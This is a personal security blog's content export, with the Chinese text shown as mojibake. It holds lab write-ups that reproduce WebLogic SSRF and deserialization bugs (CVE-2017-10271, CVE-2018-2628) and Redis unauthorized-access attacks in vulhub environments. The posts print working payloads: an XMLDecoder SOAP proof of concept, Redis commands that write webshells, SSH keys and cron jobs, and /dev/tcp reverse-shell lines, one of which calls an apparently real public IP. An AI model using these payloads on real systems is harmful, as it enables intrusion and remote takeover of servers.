{"meta":{"title":"redfishçš„å­¦ä¹ ç¬”è®°","subtitle":"redfishçš„å­¦ä¹ ç¬”è®°","description":"","author":"John Doe","url":"https://REDREDREDFISH.github.io","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2021-12-02T08:13:30.951Z","updated":"2021-12-02T08:13:30.951Z","comments":false,"path":"categories/index.html","permalink":"https://redredredfish.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-12-02T14:03:06.936Z","updated":"2021-12-02T14:03:06.936Z","comments":true,"path":"repository/index.html","permalink":"https://redredredfish.github.io/repository/index.html","excerpt":"","text":"Githubgithub: username: REDREDREDFISH # github username"},{"title":"æ ‡ç­¾","date":"2021-12-02T09:44:47.223Z","updated":"2021-12-02T08:13:30.956Z","comments":false,"path":"tags/index.html","permalink":"https://redredredfish.github.io/tags/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2021-12-02T15:48:58.244Z","updated":"2021-12-02T08:13:30.952Z","comments":true,"path":"links/index.html","permalink":"https://redredredfish.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"vulhub weblogic ssrfå¤ç°","slug":"vulhub-weblogic-ssrfå¤ç°","date":"2021-11-19T18:05:00.000Z","updated":"2021-12-21T18:16:21.034Z","comments":true,"path":"2021/11/20/vulhub-weblogic-ssrfå¤ç°/","link":"","permalink":"https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"VPS:x.x.x.x è·³æ¿æœºdebianï¼š192.168.130.129 weblogic å†…ç½‘ubuntuï¼š192.168.130.132 redis 1ã€operatorå‚æ•°å¯ä»¥è°ƒç”¨å¤–éƒ¨urlï¼Œç”±äºæœªåšé™åˆ¶ï¼Œé€ æˆssrfï¼Œå¯ä»¥å€ŸåŠ©å®ƒæ¢æµ‹æœåŠ¡å™¨ç«¯å£ï¼Œå¦‚ä¸‹ä¸¤ç§ä¸åŒçš„æŠ¥é”™ http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389 2ã€é€šè¿‡ssrfæ¢æµ‹å†…ç½‘ä¸»æœºï¼Œå‘ç°å†…ç½‘ä¸»æœº192.168.130.132å¼€å¯6379ä¸”å­˜åœ¨redisæœªæˆæƒï¼Œå¯ä»¥é€šè¿‡httpçš„getè¯·æ±‚å†™å…¥shell ä¸ºä»€ä¹ˆgetè¯·æ±‚èƒ½å†™shell 1ã€redisæœªæˆæƒ 2ã€redisé€šè¿‡æ¢è¡Œç¬¦(\\r\\n)æ¥åˆ†éš”å‘½ä»¤ 3ã€ç›®æ ‡ä¸»æœºå¼€å¯å®šæ—¶ä»»åŠ¡ 3ã€VPSç›‘å¬6666ç«¯å£ root@iZbp1h497hkijddeblcm8jZ:~# nc -lvp 6666 Listening on [0.0.0.0] (family 0, port 6666) 4ã€getå†™å®šæ—¶ä»»åŠ¡ shell /etc/crontab set 1 &quot;\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/VPS:ip/6666 0&gt;&amp;1&#39;\\n\\n\\n\\n&quot; config set dir /etc/ config set dbfilename crontab save å‘½ä»¤ä¹‹é—´ç”¨\\r\\nåˆ†éš”ï¼Œurlç¼–ç %0D%0Aï¼Œå…¨éƒ¨urlç¼–ç  set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.97.50.242%2F6666%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A 5ã€ä¼ å‚ï¼Œåå¼¹shell é‡åˆ°çš„å‘ 1.å®šæ—¶ä»»åŠ¡ä¸ä¸€å®šä¼šæ‰§è¡Œ 2.ä¸åŒç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›®å½•ä¸ä¸€æ · /etc/crontab #å¤§éƒ¨åˆ†linux /etc/cron.d/ #ubuntu /var/spool/cron/root #centOS /var/spool/cron/crontabs/root #debian 3.ä¸å¤ªç†è§£READMEé‡Œçš„shellæœ€åä¸ºå•¥è¦åŠ ä¸ªaaa","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ssrf","slug":"webæ¼æ´/ssrf","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://redredredfish.github.io/tags/ssrf/"}],"author":"redfish"},{"title":"weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(äºŒ)","slug":"weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£-äºŒ","date":"2021-07-08T07:18:00.000Z","updated":"2021-12-06T07:19:19.216Z","comments":true,"path":"2021/07/08/weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£-äºŒ/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/","excerpt":"","text":"å‰è¨€æ¥ç€ä¸Šç¯‡ï¼Œè¿™æ¬¡å¤ç°ç»å…¸çš„weblogicååºåˆ—åŒ–æ¼æ´â€”CVE-2018-2628å±äºåˆ©ç”¨T3åè®®é…åˆRMPæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚åŒæ ·å…ˆåˆ©ç”¨vulhubå¿«é€Ÿå¤ç°ï¼Œç„¶åå†æ¥çœ‹çœ‹åŸç†ã€‚ æ¼æ´å¤ç°CVE-2018-2628 å½±å“èŒƒå›´ï¼š10.3.6.0ã€12.1.3.0ã€12.2.1.2ã€12.2.1.3 dockerå¼€å¯ç¯å¢ƒ 1root@kali:/vulhub/weblogic/CVE-2018-2628# docker-compose up -d æµè§ˆå™¨è®¿é—®localhost:7001/consoleï¼Œå‡ºç°weblogicçš„ç™»å½•ç•Œé¢ï¼Œè¯´æ˜ç¯å¢ƒå·²ç»æ­å¥½äº† (â•¹Ú¡â•¹ )vulhub yyds!å¯ä»¥çœ‹åˆ°weblogicçš„ç‰ˆæœ¬æ˜¯10.3.6.0åˆ©ç”¨ysoserialå¯åŠ¨ä¸€ä¸ªJRMP ServeræœåŠ¡ç›‘å¬è¿™é‡Œæ’ä¸€å¥ç¼–è¯‘ysoserialæ³¨æ„JDKç‰ˆæœ¬ä¸è¦è¿‡é«˜ï¼Œå»ºè®®åœ¨1.7u21ä»¥ä¸‹ï¼Œå¡äº†å¥½ä¹…â”—|ï½€Oâ€²|â”› å¼€å¯ç›‘å¬ï¼Œå‘½ä»¤æ‰§è¡Œè¿™é‡Œè€åŠæ³•ï¼Œå°è¯•æ–°å»ºä¸€ä¸ªshellæ–‡ä»¶ï¼Œæ¯”è¾ƒç›´è§‚ 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener ç«¯å£ CommonsCollections1 &quot;touch /tmp/shell&quot; ä½¿ç”¨vulhubæä¾›çš„expè„šæœ¬ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œä¿å­˜åœ¨ysoserial-0.0.6-SNAPSHOT-all.jaråŒç›®å½•ä¸‹æ‰§è¡Œexp 1python CVE-2018-2628exp.py [å¼€å¯weblogicçš„IP] [ç«¯å£] ysoserial-0.0.6-SNAPSHOT-all.jar [å¼€å¯JRMP Serverçš„IP] [ç›‘å¬ç«¯å£] JRMPClient expå¼€å§‹è·‘ï¼Œç›‘å¬æˆåŠŸ expè·‘å®Œï¼Œè¿›å…¥dockerå®¹å™¨æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ 1root@kali:/vulhub/weblogic/CVE-2018-2628# docker-compose exec weblogic bash å¤ç°å®Œæˆ æ¼æ´åŸç†çœ‹ä¸€ä¸‹å®˜æ–¹çš„æ¼æ´ç®€ä»‹ Oracle WebLogic Serveræ˜¯ç¾å›½ç”²éª¨æ–‡ï¼ˆOracleï¼‰å…¬å¸çš„ä¸€æ¬¾é€‚ç”¨äºäº‘ç¯å¢ƒå’Œä¼ ç»Ÿç¯å¢ƒçš„åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç°ä»£è½»å‹å¼€å‘å¹³å°ï¼Œæ”¯æŒåº”ç”¨ä»å¼€å‘åˆ°ç”Ÿäº§çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå¹¶ç®€åŒ–äº†åº”ç”¨çš„éƒ¨ç½²å’Œç®¡ç†ã€‚WLS Coreæ˜¯å…¶ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒç»„ä»¶ã€‚ Oracle WebLogic Serverä¸­çš„WLSæ ¸å¿ƒç»„ä»¶å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…å¯é€šè¿‡è¿œç¨‹å‘é€æ”»å‡»æ•°æ®ï¼Œå€ŸåŠ©T3åè®®åœ¨WebLogic Serverä¸­æ‰§è¡Œååºåˆ—åŒ–æ“ä½œåˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»£ç ã€‚ é¦–å…ˆéœ€è¦ææ‡‚å•¥æ˜¯T3åè®® T3åè®®ï¼šWebLogic Server ä¸­çš„ RMI(è¿œç¨‹æ–¹æ³•è°ƒç”¨)é€šä¿¡ä½¿ç”¨ T3 åè®®åœ¨ WebLogic Server å’Œå…¶ä»– Java ç¨‹åºï¼ˆåŒ…æ‹¬å®¢æˆ·ç«¯åŠå…¶ä»– WebLogic Server å®ä¾‹ï¼‰é—´ä¼ è¾“æ•°æ®ã€‚JRMP ServeræœåŠ¡ï¼šjavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®® åˆ©ç”¨nmapå¿«é€Ÿæ£€æµ‹T3åè®®æ˜¯å¦å¼€æ”¾ 1nmap -sV IP --script=weblogic-t3-info.nse -p 7001 å¤§è‡´æµç¨‹ ç»“åˆexpæ¥çœ‹ä¸»å‡½æ•°å¾ˆçŸ­ï¼Œæ¥æ”¶JRMPå‚æ•°ï¼Œæ‰§è¡Œexploitå‡½æ•°exploitä¸­ï¼Œçœ‹åå­—t3_handshakeå’Œbuild_t3_request_objectåº”è¯¥æ˜¯å»ºç«‹T3è¿æ¥ï¼Œgenerate_payloadåº”è¯¥æ˜¯åºåˆ—åŒ–æ•°æ®,send_payload_objdataè‡ªç„¶å°±æ˜¯å‘é€æ•°æ®åŒ…äº†å‘é€T3åè®®å¤´æ•°æ®åŒ…æ„é€ åºåˆ—åŒ–æ•°æ®åŒ…å¹¶å‘é€ ä¿®å¤å»ºè®®æ‰“è¡¥ä¸å¯¹T3åè®®è¿›è¡Œè®¿é—®æ§åˆ¶ å‚è€ƒhttps://www.cnblogs.com/afanti/p/10256840.htmlhttps://blog.csdn.net/u014715599/article/details/85256193","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogicååºåˆ—åŒ–","slug":"weblogicååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(ä¸€)","slug":"weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£-ä¸€","date":"2021-07-08T03:07:00.000Z","updated":"2021-12-06T03:09:51.923Z","comments":true,"path":"2021/07/08/weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£-ä¸€/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/","excerpt":"","text":"å•¥æ˜¯weblogic WebLogicæ˜¯Oracleå‘å¸ƒçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„webä¸­é—´ä»¶å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºtomcat pro maxğŸ™ƒ Weblogicååºåˆ—åŒ–æ¼æ´çš„å‡ ä¸ªåˆ©ç”¨é˜¶æ®µä»åˆ©ç”¨æ–¹å¼æ¥çœ‹,åˆ†ä¸ºä¸‰ç±» 1.ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡(CVE-2015-4582ã€CVE-2016-0638ã€CVE-2016-3510ã€CVE-2020-2555ã€CVE-2020-2883)2.åˆ©ç”¨T3åè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®(CVE2017-3248ã€CVE2018-2628ã€CVE2018-2893ã€CVE2018-3245ã€CVE-2018-3191ã€CVE-2020-14644ã€CVE-2020-14645)è¿˜æœ‰åˆ©ç”¨IIOPåè®®çš„CVE-2020-25513.é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729) æ¼æ´å¤ç°ç”±äºæ¼æ´ä¼—å¤šï¼Œæ­å»ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œè¿˜æ˜¯å…ˆåˆ©ç”¨vulhubä¸­çš„CVE-2017-10271ã€CVE-2018-2628ã€CVE-2018-2894ã€CVE-2020-14882å‡ ä¸ªæ ‡å¿—æ€§çš„æ¼æ´ç¯å¢ƒè¿›è¡Œå¤ç°ã€‚ å…ˆä»æœ€å¤è€çš„å¼€å§‹ CVE-2017-10271 å½±å“èŒƒå›´ï¼š10.3.6.0.0ï¼Œ12.1.3.0.0ï¼Œ12.2.1.1.0ï¼Œ12.2.1.2.0 dockerå¼€å¯ç¯å¢ƒ 1root@kali:/vulhub/weblogic/CVE-2017-10271# docker-compose up -d è¿œå¤ç‰ˆæœ¬ï¼Œç¯å¢ƒå¥½å¤§å…ˆå¿ä¸€ä¸‹ ç­‰å¾…çš„è¿‡ç¨‹ä¸­å…ˆç†è§£ä¸€ä¸‹æ¼æ´åŸç†ä»¥åŠvulhubç»™å‡ºçš„poc è¯¥æ¼æ´ä¸»è¦é’ˆå¯¹weblogicçš„WLS-WebServicesç»„ä»¶å±äºä¸Šè¿°ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ç¬¬ä¸‰ç±»å¤§è‡´çš„åŸç†é€šè¿‡ä¼ è¾“javabean XMLæ–¹å¼æ„é€ æ¶æ„XMLæ•°æ®é€ æˆä»£ç æ‰§è¡Œ ç»“åˆpocæ¥çœ‹ 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot; /&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body /&gt;&lt;/soapenv:Envelope&gt; å¤§æ¦‚æ˜¯å‘ç½‘ç«™çš„/wls-wsat/CoordinatorPortTypeè·¯å¾„ä¼ å…¥xmlæ•°æ®ï¼Œè¿™ä¸²xmlç›®çš„æ˜¯åå¼¹shellOKï¼Œç¯å¢ƒèµ·å¥½å¼€å§‹å¤ç° è®¿é—®localhost:7001/wls-wsat/CoordinatorPortTypeï¼Œæ˜¾ç¤ºwls-wsatç»„ä»¶çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè¡¨ç¤ºæœåŠ¡å·²ç»å¼€å¯æœ¬åœ°ç›‘å¬6666ç«¯å£ 1root@kali:/# nc -l -p 6666 bpæŠ“åŒ…é‡æ”¾æ„é€ å¥½çš„æ•°æ®åŒ…ï¼Œæ³¨æ„å­—æ®µContent-Typeæ”¹ä¸ºtext/xmlæˆåŠŸåå¼¹shellï¼ŒæœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬ä¼ å…¥çš„/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 æ¼æ´åŸç†æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹å¾ˆç®€å•æœ‰ä¸¤ä¸ªç–‘é—®ç‚¹ 1.wls-wsatç»„ä»¶å¦‚ä½•å¤„ç†xmlæ•°æ®2.é€ æˆååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹åœ¨å“ª å°è¯•ä¼ å…¥ä»»æ„å‘½ä»¤åœ¨å“åº”ä¸­çœ‹åˆ°äº†è¿”å›çš„xmlæ•°æ®ä»¥åŠæ•´ä¸ªå¤„ç†è¿‡ç¨‹çš„è°ƒç”¨æ ˆå¯ä»¥çœ‹åˆ°å¤„ç†è¿‡ç¨‹æœ€åè°ƒç”¨äº†java.beans.XMLDecoderæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå°†XMLæ•°æ®ååºåˆ—åŒ–ä¸ºjavaå¯¹è±¡ï¼Œè¿™é‡Œé€ æˆäº†æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ æ ¹æ®vulhubæä¾›çš„æŠ€æœ¯æ–‡æ¡£ã€å‚è€ƒå¤§ä½¬çš„åˆ†æè¿‡ç¨‹å¯ä»¥å¾—çŸ¥å¤§è‡´çš„å¤„ç†è¿‡ç¨‹ 1.æ ¹æ®POCï¼Œå½“æˆ‘ä»¬ä¼ å…¥&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;æ ‡ç­¾åŒ…è£¹çš„æ•°æ®æ—¶ï¼Œwls-wsatä½¿ç”¨äº†weblogicè‡ªå¸¦çš„webserviceså¤„ç†ç¨‹åºæ¥å¤„ç†SOAPè¯·æ±‚2.è¯¥å¤„ç†ç¨‹åºé¦–å…ˆè°ƒç”¨weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequestæ–¹æ³•è·å–åˆ°æˆ‘ä»¬ä¼ å…¥çš„xmlæ•°æ®ä¸ºvar1ï¼Œå®šä¹‰var2ä¸ºå¤„ç†è¿‡çš„var1æ•°æ®3.é€šè¿‡var2.get()æ–¹æ³•ä¸­çš„WorkAreaConstants.WORK_AREA_HEADERå‚æ•°è·å–&lt;work:WorkContext &gt;æ ‡ç­¾ä¸­çš„å†…å®¹4.å½“var3ä¸ä¸ºç©ºæ—¶ï¼Œæ‰§è¡ŒreadHeaderOld(var3); 5.åœ¨readHeaderOldä¸­ï¼Œå®ä¾‹åŒ–äº†WorkContextXmlInputAdapterï¼Œæ­¤æ—¶æ–¹æ³•å†…çš„var4æ˜¯javaæ ‡ç­¾é‡Œçš„å†…å®¹ 6.åœ¨å®ä¾‹åŒ–WorkContextXmlInputAdapterä¸­ï¼Œç›´æ¥è°ƒç”¨xmlDecoderååºåˆ—åŒ–ä¼ å…¥çš„xmlæ•°æ®ï¼Œä¹Ÿå°±æ˜¯å¤„ç†è¿‡çš„var4 ä»æ•´ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„xmlæ•°æ®ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰å—åˆ°ä»»ä½•è¿‡æ»¤ï¼Œwls-wsatçš„ç±»ä¼¼å‰¥æ´‹è‘±çš„å¤„ç†æ–¹å¼ä¸€å±‚ä¸€å±‚æ­å¼€æœ€åç›´æ¥ååºåˆ—åŒ–ï¼Œè¿™æ ·æ˜¾ç„¶æ˜¯å¾ˆä¸å®‰å…¨æ»´ã€‚","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogicååºåˆ—åŒ–","slug":"weblogicååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"redisæœªæˆæƒè®¿é—®","slug":"helloworld","date":"2021-07-07T08:05:00.000Z","updated":"2021-12-06T03:10:31.762Z","comments":true,"path":"2021/07/07/helloworld/","link":"","permalink":"https://redredredfish.github.io/2021/07/07/helloworld/","excerpt":"","text":"redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼æ¼æ´åŸç†ï¼š Redis&lt;3.2é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„å®‰å…¨ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™é»‘ç™½åå•ç­‰ç­‰ï¼Œè¿™æ ·ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šã€‚å¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç (é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œè¿˜å¯ä»¥å°†sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨./root/.sshä¸‹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹: Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç™»å½•redisæœåŠ¡ æ¼æ´å¤ç°ï¼šç¯å¢ƒï¼š æ”»å‡»æœºkali5.7.0 192.168.237.132 é¶æœº1 Ubuntu16.04 192.168.237.128 é¶æœº2 centOS7 192.168.237.133 redis 2.8.17 é¶æœº1å¼€å¯redis-serverï¼Œæ”»å‡»æœº./redis-cli -h å°è¯•è¿æ¥ç”±äºé¶æœº1æ²¡æœ‰å¼€å¯å®‰å…¨ç­–ç•¥ä¸”é»˜è®¤æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯é€ æˆæ”»å‡»æœºå¯ä»¥æœªæˆæƒè®¿é—®ä¸”æ‰§è¡Œå‘½ä»¤è·å–æ•æ„Ÿæ•°æ® åˆ©ç”¨æ–¹å¼ä¸€ï¼šwebshellæ”»å‡»æœºè¿›è¡Œæœªæˆæƒè®¿é—®ï¼Œåˆ©ç”¨redisçš„config setå‘½ä»¤å°†webshellå†™å…¥é¶æœº2ç½‘ç«™ç›®å½•ä¸‹(*Redis Config Set å‘½ä»¤å¯ä»¥åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®) 1234config set dir #è®¾ç½®è·¯å¾„config set dbfilename #è®¾ç½®æ–‡ä»¶åset webshell #å†™å…¥keyå€¼â€œwebshellâ€å¯¹åº”çš„å€¼save #å°†æ‰€æœ‰keyå€¼ä¿å­˜åœ¨æ–‡ä»¶ä¸­ åœ¨é¶æœº2ä¸ŠæŸ¥çœ‹å·²ç»å†™å…¥äº†shell.phpæ–‡ä»¶ æµè§ˆå™¨è®¿é—®http://é¶æœº2/shell.php,å‘ç°æˆåŠŸå†™å…¥webshell åŒç†å¯å†™å…¥ä¸€å¥è¯æœ¨é©¬\\n\\n\\næ¢è¡Œé¿å…å› &lt;?å¯¼è‡´shellæ— æ³•è§£æ èœåˆ€æˆåŠŸè¿æ¥ åˆ©ç”¨æ–¹å¼äºŒï¼šå†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•å°†æ”»å‡»æœºæœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹redisçš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨é¶æœº2çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyï¼Œä»è€Œé€šè¿‡sshç™»å½•é¶æœº2ã€‚ 1ssh-keygen -t rsa #ç”Ÿæˆsshå…¬é’¥å’Œç§é’¥,é»˜è®¤å¯†ç ä¸ºç©º å°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ°ssh.txt 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ssh.txt å°†ä¿å­˜çš„å…¬é’¥ssh.txtå†™å…¥é¶æœº2 redisçš„keyå€¼sshä¸­ 1cat /root/.ssh/ssh.txt | redis-cli -h é¶æœº2 -x set ssh è¿œç¨‹ç™»å½•é¶æœº2çš„redisæœåŠ¡ï¼Œæ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½• 1config set dir /root/.ssh è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keys,ä¿å­˜ä¸Šä¼ æ”»å‡»æœºä½¿ç”¨sshå…å¯†ç™»å½•é¶æœº2 æˆåŠŸç™»å½•é¶æœº2 åˆ©ç”¨æ–¹å¼ä¸‰ï¼šcrontabå®šæ—¶ä»»åŠ¡ï¼Œåå¼¹shellæ”»å‡»æœºç›‘å¬9999ç«¯å£ 1nc -l ç«¯å£ è¿œç¨‹ç™»å½•redisï¼Œå†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œä¸€åˆ†é’Ÿåæ‰§è¡Œbashåå¼¹shell 1234set test &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/æ”»å‡»æœº/ç›‘å¬ç«¯å£ 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename testsave åå¼¹shellæˆåŠŸ 